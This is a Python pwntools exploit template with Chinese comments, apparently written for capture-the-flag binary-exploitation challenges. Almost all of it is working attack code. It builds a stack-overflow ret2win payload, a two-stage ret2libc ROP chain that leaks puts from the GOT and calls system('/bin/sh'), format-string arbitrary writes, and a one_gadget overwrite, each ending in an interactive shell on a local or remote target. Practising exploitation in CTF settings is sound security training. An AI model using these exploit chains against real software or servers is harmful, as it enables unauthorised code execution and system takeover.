#!/usr/bin/env python3
"""
pwntools 基础 PWN 模板
覆盖栈溢出、格式化字符串、ret2libc 等常见题型
根据题目取消注释对应模块并修改参数
"""

from pwn import *

# ========== 配置 ==========
context.arch = 'amd64'   # 或 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 连接方式
LOCAL = True
BINARY = './pwn'
HOST = 'challenge.ctf.com'
PORT = 9999

if LOCAL:
    p = process(BINARY)
    # gdb.attach(p, 'b *0x401234\ncontinue')  # 附加 GDB
else:
    p = remote(HOST, PORT)

elf = ELF(BINARY)
# libc = ELF('./libc.so.6')  # 如果有 libc


# ========== 辅助函数 ==========
def sla(data, line):
    p.sendlineafter(data, line)

def sa(data, payload):
    p.sendafter(data, payload)

def get_offset():
    """用 cyclic 计算溢出偏移"""
    p.sendline(cyclic(200))
    p.wait()
    # 在 GDB 中查看崩溃地址，用 cyclic_find 查偏移
    # offset = cyclic_find(0x61616168)


# ========== 1. 栈溢出 → ret2win ==========
def ret2win():
    offset = 72  # 修改为实际偏移
    win_addr = elf.symbols['backdoor']  # 修改为后门函数名
    payload = b'A' * offset + p64(win_addr)
    p.sendline(payload)
    p.interactive()


# ========== 2. 栈溢出 → ret2libc ==========
def ret2libc():
    offset = 72  # 修改为实际偏移
    libc = ELF('./libc.so.6')  # 需要对应的 libc

    # 第一步：泄露 libc 地址
    put_got = elf.got['puts']
    put_plt = elf.plt['puts']
    main_addr = elf.symbols['main']
    pop_rdi = 0x401233  # ROPgadget --binary pwn | grep "pop rdi"
    ret = 0x40101a      # 用于栈对齐

    payload = b'A' * offset
    payload += p64(pop_rdi) + p64(put_got)
    payload += p64(put_plt)
    payload += p64(main_addr)

    p.sendline(payload)
    p.recvuntil('\n')
    puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f"puts @ {hex(puts_addr)}")

    # 第二步：计算 libc 基址
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    log.info(f"libc base @ {hex(libc_base)}")
    log.info(f"system @ {hex(system_addr)}")

    # 第三步：再次溢出 getshell
    payload2 = b'A' * offset
    payload2 += p64(ret)           # 栈对齐
    payload2 += p64(pop_rdi) + p64(bin_sh)
    payload2 += p64(system_addr)

    p.sendline(payload2)
    p.interactive()


# ========== 3. 格式化字符串 ==========
def fmtstr_exploit():
    offset = 6  # 格式化字符串在栈上的偏移，需调试确定

    # 方法1：pwntools fmtstr_payload（推荐）
    target_addr = 0x601040  # 要写入的目标地址
    target_value = 0x12345678  # 要写入的值
    payload = fmtstr_payload(offset, {target_addr: target_value})
    p.sendline(payload)

    # 方法2：手动构造（更灵活）
    # payload = p64(target_addr) + b'%9$n'

    p.interactive()


# ========== 4. 栈溢出 → one_gadget ==========
def one_gadget_shell():
    offset = 72
    libc = ELF('./libc.so.6')
    libc_base = 0x7f0000000000  # 需泄露

    # one_gadget libc.so.6 的输出，选择满足约束的
    one_gadget_addr = libc_base + 0x4f2c5
    payload = b'A' * offset + p64(one_gadget_addr)
    p.sendline(payload)
    p.interactive()


# ========== 运行 ==========
if __name__ == "__main__":
    # 取消注释选择对应攻击
    # ret2win()
    # ret2libc()
    # fmtstr_exploit()
    # one_gadget_shell()
    p.interactive()
